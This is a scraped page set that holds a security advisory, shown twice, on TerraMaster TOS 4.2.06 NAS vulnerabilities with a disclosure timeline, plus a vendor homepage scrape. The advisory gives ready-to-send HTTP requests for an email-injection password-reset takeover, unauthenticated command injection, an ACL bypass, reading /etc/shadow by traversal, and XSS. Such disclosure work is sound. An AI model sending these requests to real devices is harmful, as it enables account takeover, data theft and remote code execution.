![](https://www.ihteam.net/wp-content/uploads/Touch_file.jpg)

Full exploit available at: <https://iht.li/paste.php?hash=UEUS>

## **Weak Access Control List**

CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:

`POST /tos/index.php?explorer/pathChmod HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/tos/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it
Connection: close

list=[{"type":"folder","path":"Volume%2520%25231%252Fpublic%252FISO%252F","userlist":"admin,testaccount,user,@admin,@allusers","right":"2,2,2,2,2","appmode":"0"}]`

The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.

## **Directory Traversal**

CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:

`GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/shadow HTTP/1.1
Host: 192.168.1.206:8181
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=xxxxxxxxxxxx;
Connection: close`

The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.

## **Cross-Site Scripting**

CVE-2020-28184
XSS via Host header on port 80 (unauthenticated)
`GET / HTTP/1.1
Host: 192.168.1.206'-alert(1)-'`

Via GET (authenticated)
`GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1
Host: 192.168.1.206:8181`

## **Software update via insecure communication channel**

CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):
`"AmazonS3":
{
"url":"http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2"`

This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.

## **Responsible Disclosure timeline:**

2 Nov 2020 – Details sent to TerraMaster Team and CVE request submitted
17 Nov 2020 – TerraMaster confirms that fixes will be implemented in version 4.2.07
3 Dec 2020 – TerraMaster releases TOS 4.2.07
9 Dec 2020 – IHTeam confirms issues were fixed in 4.2.07
12 Dec 2020 – IHTeam releases a public disclosure article

---

[←
DEFCON 28 – Safe mode](https://www.ihteam.net/hack-meet/defcon-28-safe-mode/)
[→
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)

---

## 2 replies on “TerraMaster TOS Multiple Vulnerabilities”

![](https://secure.gravatar.com/avatar/53eaef94379535acdf3506a9c69be6cc?s=120&d=mm&r=g)Juniorsays:
[16 June 2022 at 12:59](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1471)

Congrats for your findings! I have a question about CVE-2020-28188. Is it the same as CVE-2020-35665? What is the difference?

In this article you say the vulnerable page is “/include/makecvs.php” and the vulnerable parameter is “Event”, but as a PoC you use “/tos/index.php?explorer/pathList&path=…”. In the exploit that you share you are only referencing the “makecvs” file. Is it a mistake?

Thanks!

[Reply](#comment-1471)

![](https://secure.gravatar.com/avatar/586f57e8e7bad3b0e6473a2038581861?s=120&d=mm&r=g)r00tsays:
[10 July 2022 at 16:19](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1472)

Hello, CVE-2020-35665 was created on the 22nd of December and based on a replica of our original exploit (released on 2nd of November).

CVEs can be requested by researchers at any time. MITRE won’t check for duplicates.

Regarding your question about the vulnerable path, they both are vulnerable to RCE, but “/include/makecvs.php?Event=” was instead used for the exploit.

In fact, there was also another path vulnerable to RCE (required auth): ajax/logtable.php

[Reply](#comment-1472)By Post Author

---

## Leave a Reply [Cancel reply](/advisory/terramaster-tos-multiple-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)



=== Content from www.terra-master.com_63994f87_20250119_124146.html ===


**JavaScript seems to be disabled in your browser.**

You must have JavaScript enabled in your browser to utilize the functionality of this website.

 [![Terramaster Official Site](https://img.terra-master.com/skin/frontend/base/default/images/Terramaster_logo.svg) ![Terramaster Official Site](https://img.terra-master.com/skin/frontend/base/default/images/Terramaster_logo.svg)](https://www.terra-master.com/global/)

1. [PRODUCTS](https://www.terra-master.com/global/products.html)
   * [Home/SOHO NAS](https://www.terra-master.com/global/products/homesoho-nas.html)
   * [SMB NAS](https://www.terra-master.com/global/products/smallmedium-businesses-nas.html)
   * [Enterprise NAS](https://www.terra-master.com/global/products/enterprise-network-storage-server.html)
   * [Home/SOHO DAS](https://www.terra-master.com/global/products/homesoho-das.html)
   * [DAS for Video Editing](https://www.terra-master.com/global/products/video-professional-das.html)
   * [Accessories](https://www.terra-master.com/global/products/accessories.html)
2. [Support](https://www.terra-master.com/global/support/)
   * [Quick Installation Guide](https://support.terra-master.com/quickguide/)
   * [Video Guide](https://www.terra-master.com/global/video-guide/)
   * [TOS Help](https://toshelp.terra-master.com/web/#/en/desktop)
   * [FAQ](https://support.terra-master.com/faqs/tnas-faqs)
   * [DOWNLOAD](https://download.terra-master.com/?lng=en)
   * [Compatibility](https://www.terra-master.com/global/compatibility/)
   * [Register Product](https://www.terra-master.com/global/warranty/)
   * [Forum](https://forum.terra-master.com/en)
   * Live Chat
3. ABOUT US
   * [About TerraMaster](https://www.terra-master.com/global/about/)
   * [News](https://www.terra-master.com/global/press/)
   * [Awards](https://www.terra-master.com/global/awards/)
   * [HOT Deals](https://www.terra-master.com/global/deals)
   * [Blog](https://www.terra-master.com/global/blog)
   * [Customer Stories](https://www.terra-master.com/global/stories)
   * [Where to Buy](https://www.terra-master.com/global/reseller/)
   * [Contact Us](https://www.terra-master.com/global/contact-us/)
   * [Forum](http://forum.terra-master.com/en/)
   * [Become a Partner](https://www.terra-master.com/global/partner/)
4. [Forum](https://forum.terra-master.com/en/)
5. [Shop](https://shop.terra-master.com/%20)

 [Menu](#header-nav)

[0](https://www.terra-master.com/global/checkout/cart/)

Recently added item(s) ×

You have no items in your shopping cart.

[LOGIN](https://www.terra-master.com/global/customer/account/login/)

[English/Global](#lanfg)
[![](https://img.terra-master.com/media/global_lang.png)](#lanfg)
![](https://img.terra-master.com/media/qyyy.svg)
### Region & Language

* [English/Global](https://www.terra-master.com/global/)
* [English/US](https://www.terra-master.com/us/)
* [English/UK](https://www.terra-master.com/uk/)
* [Deutsch/Deutschland](https://www.terra-master.com/de/)

* [Français/France](https://www.terra-master.com/fr/)
* [Español/España](https://www.terra-master.com/es/)
* [Italiano/Italia](https://www.terra-master.com/it/)
* [简体中文/中国](https://www.terra-master.com/cn/)

* [日本語/日本](https://www.terra-master.com/jp/)
* [한국어/한국](https://www.terra-master.com/kr/)
* [Russian/Russia](https://www.terra-master.com/ru/)
* [Polish](https://www.terra-master.com/pl/)

[0](https://www.terra-master.com/global/checkout/cart/)

Recently added item(s) ×

You have no items in your shopping cart.

[LOGIN](https://www.terra-master.com/global/customer/account/login/)

* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-778x960.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-640-920.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/happynewyear-1990.jpg)
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/tnasmobile-1990990.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/tnasmobile-640x920_3_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/778x960-tnasm.jpg)

  TNAS Mobile 3

  Smarter NAS Management

  Upgraded Backup Experience for Mobile Devices

  Smarter NAS Management

  Upgraded Backup Experience for Mobile Devices

  Smarter NAS Management

  Smarter NAS Management

   with New Features
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-778x960_2_1_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-640x920_2_1_.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/u4-500-1970.jpg)
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

  ![](https://img.terra-master.com/media/revslider/mainfeature/yure.jpg)

  ![](https://img.terra-master.com/media/revslider/__ipad.jpg)

  ![](https://img.terra-master.com/media/revslider/mainfeature/__ip_1.jpg)

  2024 Fall New Product Lineup

  Powerful, Speedy and Quiet

  All Powered by TOS 6

  Powerful, Speedy and Quiet

  2024 Fall New Product Lineup

  All Powered by TOS 6
* ![](https://img.terra-master.com/skin/frontend/base/default/nwdthemes/revslider/public/assets/images/transparent.png)

[![](https://img.terra-master.com/media/wysiwyg/picture/bbstwo.jpg)](https://www.terra-master.com/global/bbs)

BBS

Business Backup Suite provides an integrated backup solution.

[![](https://img.terra-master.com/media/wysiwyg/picture/RAID_1_.jpg)](https://support.terra-master.com/raidcalculation/?lang=en)

What is TRAID?

Learn more about TRAID and TRAID+.

[![](https://img.terra-master.com/media/wysiwyg/picture/Hot-Deals.jpg)](https://www.terra-master.com/global/deals)

Hot Deals

Get the latest Deals Information of TerraMaster

[![](https://img.terra-master.com/media/wysiwyg/picture/TerraMaster_Parnter_Program.jpg)](https://www.terra-master.com/global/partner)

Partner Program

Welcome to Join the TerraMaster Partner Program

[![](https://img.terra-master.com/media/Banners/images/TOS-6-Banner-PC.jpg)](//www.youtube.com/embed/x7CzWrqM6DI?autoplay=1)
[![](https://img.terra-master.com/media/Banners/images/TOS-6_APP.jpg)](//www.youtube.com/embed/x7CzWrqM6DI?autoplay=1)

[Elevated Disk Array Management Solution
Higher Data Security for Professionals and Business users](https://www.terra-master.com/global/terramaster-traid)

![](https://img.terra-master.com/media/homebuilderone/wbfSvTRAID+_IP.jpg)

[Elevated Disk Array Management Solution
Higher Data Security for Professionals and Business users](https://www.terra-master.com/global/terramaster-traid)

**BECOME A TERRAMASTER INSIDER**

Sign up to receive exclusive offers and updates

- *\**Please type the letters below
- ![Reload captcha](https://img.terra-master.com/skin/frontend/base/default/images/reload.png)
  ![](https://img.terra-master.com/media/captcha/base/fa001aec1cdf71b18a981d5211f71a42.png)
SIGN UP

>
**SALES**

* [Home/SOHO NAS](https://www.terra-master.com/global/products/homesoho-nas.html)
* [SMB NAS](https://www.terra-master.com/global/products/smallmedium-businesses-nas.html)
* [Enterprise NAS](https://www.terra-master.com/global/products/enterprise-network-storage-server.html)
* [Home/SOHO DAS](https://www.terra-master.com/global/products/homesoho-das.html)
* [DAS for Video Editing](https://www.terra-master.com/global/products/video-professional-das.html)
* [TerraMaster OS - TOS](https://www.terra-master.com/global/alltos/)
* [Live Demo](https://www.terra-master.com/global/live-demo)
**SUPPORT**

* [Quick Installation Guide](https://start.terra-master.com/index.html?&lang=en-)
* [Download](https://download.terra-master.com/?lng=en)
* [Compatibility](https://www.terra-master.com/global/compatibility/)
* [Video Installation Guide](https://www.terra-master.com/global/video-guide/)
* [TOS Help](https://help.terra-master.com/TOS5/view/?lang/en-us)
* [FAQS](https://support.terra-master.com/faqs/tnas-faqs)
* [Register Product](//www.terra-master.com/global/warranty/)
* [Developer](//www.terra-master.com/global/developer/)
**About Us**

* [About TerraMaster](//www.terra-master.com/global/about/)
* [News](https://www.terra-master.com/global/press/)
* [Awards](https://www.terra-master.com/global/awards/)
* [HOT Deals](https://www.terra-master.com/global/deals)
* [Blog](https://www.terra-master.com/global/blog)
* [Customer Stories](https://www.terra-master.com/global/stories)
* [Where to Buy](https://www.terra-master.com/global/reseller/)
* [Contact Us](https://www.terra-master.com/global/contact-us/)
* [Forum](http://forum.terra-master.com/en/)
* [Become a Partner](//www.terra-master.com/global/partner/)
**Terms**

* [Warranty And Return](//www.terra-master.com/global/warranty-returns/)
* [Shipping Policies](https://www.terra-master.com/global/shipping-policy/)
* [Terms And Conditions](//www.terra-master.com/global/clause/)
* [Privacy Statement](//www.terra-master.com/global/privacy/)
* [GPL Sources](https://www.terra-master.com/global/gplsource/)
* [EULA](https://www.terra-master.com/global/eula/)

* [![facebook""](https://img.terra-master.com/media/wysiwyg/fb-icon.png)](https://www.facebook.com/terramasterofficial/)
* [![Twitter](https://img.terra-master.com/media/wysiwyg/twt-icon.png)](https://twitter.com/terramasters)
* [![Instagram](https://img.terra-master.com/media/wysiwyg/youtube_icon.png)](https://www.youtube.com/channel/UC2x557lLdd_OM5mqQZhW-4Q)
* [![Youtube](https://img.terra-master.com/media/wysiwyg/insta_icon.png)](https://www.instagram.com/terramasterofficial/)

Cookies help us improve the user experience. By using our services, you agree to our use of cookies.

OK



=== Content from www.ihteam.net_bb611acc_20250119_124143.html ===

[Skip to the content](#site-content)
[![IHTeam Security Blog](https://www.ihteam.net/wp-content/uploads/smlogo_2.png)](https://www.ihteam.net/)IHTeam Security Blog

Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Close Menu

* [Home](/)
* [Papers](https://www.ihteam.net/papers_tutorial/)

Categories
[Advisories](https://www.ihteam.net/advisory/)
# TerraMaster TOS Multiple Vulnerabilities

* Post author

  By r00t
* Post date

  [12 December 2020](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/)
* [2 Comments on TerraMaster TOS Multiple Vulnerabilities](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comments)

TerraMaster is well known for producing data storage devices (NAS and DAS) since 2010. TOS is the name of their web interface to manage functionalities of the device.

The product is not new to security vulnerabilities, as Joshua M. of ISE highlighted back in 2018 (https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63).
In 2020, IHTeam performed a security review of the current TOS version 4.2.06 and identified the following:
CVE-2020-28184 – XSS
CVE-2020-28185 – User Enumeration
CVE-2020-28186 – Email Injection
CVE-2020-28187 – Directory Traversal
CVE-2020-28188 – Remote Command Execution
CVE-2020-28190 – Software Update Man-in-the-middle
CVE-2020-29189 – Incorrect Access Control

At the moment of writing Shodan has found around 1000 vulnerable TOS exposed on Internet – <https://www.shodan.io/search?query=X-Powered-By%3A+TerraMaster>

## **Account Takeover**

CVE-2020-28186 – The Forget Password functionality was found to be vulnerable to email injection, allowing an attacker to receive a verification code to a third-party email. This attack only works if the user specified a ‘Security email’ on the account.

The first step is to identify valid account (CVE-2020-28185) with security email set via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 28
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.1.206:8181

tab=checkuser&username=testaccount`

The response will look like the following:
`{"username":"testaccount","email":"[[email protected]](/cdn-cgi/l/email-protection)","status":1}`

We can now proceed requesting the password reset code via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 41
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

tab=validmail&email=<valid_user@email>,<attacker_controlled@email>`

Both user and attacker will receive the verification code thanks to email injection (comma separated emails); At this point we can validate the code (the cookie value must be lowercase):

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 25
Accept: /
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkcode&code=FrSkzI`

And finally reset the user’s password via:

`POST /wizard/initialise.php HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/wizard/getpass.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: check_mail=frskzi
Connection: close

tab=checkpass&username=testaccount&email=<valid_user@email>&code=FrSkzI&passwd=NewPassw0rdH3r3`

## **Unauthenticated Remote Command Execution**

CVE-2020-28188
Vulnerable page: */include/makecvs.php*
Vulnerable parameter: *Event*

Proof of Concept:
`GET /tos/index.php?explorer/pathList&path=%60touch%20/tmp/file%60 HTTP/1.1
Host: 192.168.1.206:8181`

![](https://www.ihteam.net/wp-content/uploads/Touch_file.jpg)

Full exploit available at: <https://iht.li/paste.php?hash=UEUS>

## **Weak Access Control List**

CVE-2020-29189 – When a user is created, it could be placed within a group having read-only access to NAS folders. It was found that this option could be bypassed via the following request:

`POST /tos/index.php?explorer/pathChmod HTTP/1.1
Host: 192.168.1.206:8181
Content-Length: 162
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.1.206:8181
Referer: http://192.168.1.206:8181/tos/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=9ef919de5a6d2b17f5b6a5549e45495e; tos_visit_time=1604152180; kod_name=testaccount; noshow=1; kod_user_language=it-it
Connection: close

list=[{"type":"folder","path":"Volume%2520%25231%252Fpublic%252FISO%252F","userlist":"admin,testaccount,user,@admin,@allusers","right":"2,2,2,2,2","appmode":"0"}]`

The ‘right’ array refers to the ‘userlist’ array, therefore a value of ‘2’ will grand read/write access, instead of ‘1’ that only grants read access.

## **Directory Traversal**

CVE-2020-28187 – Instances of directory traversal leading to internal file system disclosure were identified. For example the following authenticated request can be performed to read the /etc/shadow file:

`GET /tos/index.php?editor/fileGet&filename=../../../../../../etc/shadow HTTP/1.1
Host: 192.168.1.206:8181
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=xxxxxxxxxxxx;
Connection: close`

The nginx web server was running with root privileges, that’s why it was possible to read the shadow file.

## **Cross-Site Scripting**

CVE-2020-28184
XSS via Host header on port 80 (unauthenticated)
`GET / HTTP/1.1
Host: 192.168.1.206'-alert(1)-'`

Via GET (authenticated)
`GET /module/index.php?mod=%2fusr%2fwww%2fmod%2f5.%22-alert(1)-%22 HTTP/1.1
Host: 192.168.1.206:8181`

## **Software update via insecure communication channel**

CVE-2020-28190 – In addition, software update and applications are checked and delivered via un-encrypted communication channel (HTTP):
`"AmazonS3":
{
"url":"http:\/\/dl.terra-master.com\/cn\/TOS7.0CJ\/AmazonS3.bz2"`

This behavior would allow man-in-the-middle attacks to successfully install malicious applications or updates.

## **Responsible Disclosure timeline:**

2 Nov 2020 – Details sent to TerraMaster Team and CVE request submitted
17 Nov 2020 – TerraMaster confirms that fixes will be implemented in version 4.2.07
3 Dec 2020 – TerraMaster releases TOS 4.2.07
9 Dec 2020 – IHTeam confirms issues were fixed in 4.2.07
12 Dec 2020 – IHTeam releases a public disclosure article

---

[←
DEFCON 28 – Safe mode](https://www.ihteam.net/hack-meet/defcon-28-safe-mode/)
[→
OnionShare 2.3 >= 2.3.3 Vulnerabilities](https://www.ihteam.net/advisory/onionshare/)

---

## 2 replies on “TerraMaster TOS Multiple Vulnerabilities”

![](https://secure.gravatar.com/avatar/53eaef94379535acdf3506a9c69be6cc?s=120&d=mm&r=g)Juniorsays:
[16 June 2022 at 12:59](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1471)

Congrats for your findings! I have a question about CVE-2020-28188. Is it the same as CVE-2020-35665? What is the difference?

In this article you say the vulnerable page is “/include/makecvs.php” and the vulnerable parameter is “Event”, but as a PoC you use “/tos/index.php?explorer/pathList&path=…”. In the exploit that you share you are only referencing the “makecvs” file. Is it a mistake?

Thanks!

[Reply](#comment-1471)

![](https://secure.gravatar.com/avatar/586f57e8e7bad3b0e6473a2038581861?s=120&d=mm&r=g)r00tsays:
[10 July 2022 at 16:19](https://www.ihteam.net/advisory/terramaster-tos-multiple-vulnerabilities/#comment-1472)

Hello, CVE-2020-35665 was created on the 22nd of December and based on a replica of our original exploit (released on 2nd of November).

CVEs can be requested by researchers at any time. MITRE won’t check for duplicates.

Regarding your question about the vulnerable path, they both are vulnerable to RCE, but “/include/makecvs.php?Event=” was instead used for the exploit.

In fact, there was also another path vulnerable to RCE (required auth): ajax/logtable.php

[Reply](#comment-1472)By Post Author

---

## Leave a Reply [Cancel reply](/advisory/terramaster-tos-multiple-vulnerabilities/#respond)

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

 Save my name, email, and website in this browser for the next time I comment.

Δ

This site uses Akismet to reduce spam. [Learn how your comment data is processed](https://akismet.com/privacy/).

©
2025 [IHTeam Security Blog](https://www.ihteam.net/)

[Powered by WordPress](https://en-gb.wordpress.org/)

[To the top ↑
Up ↑](#site-header)


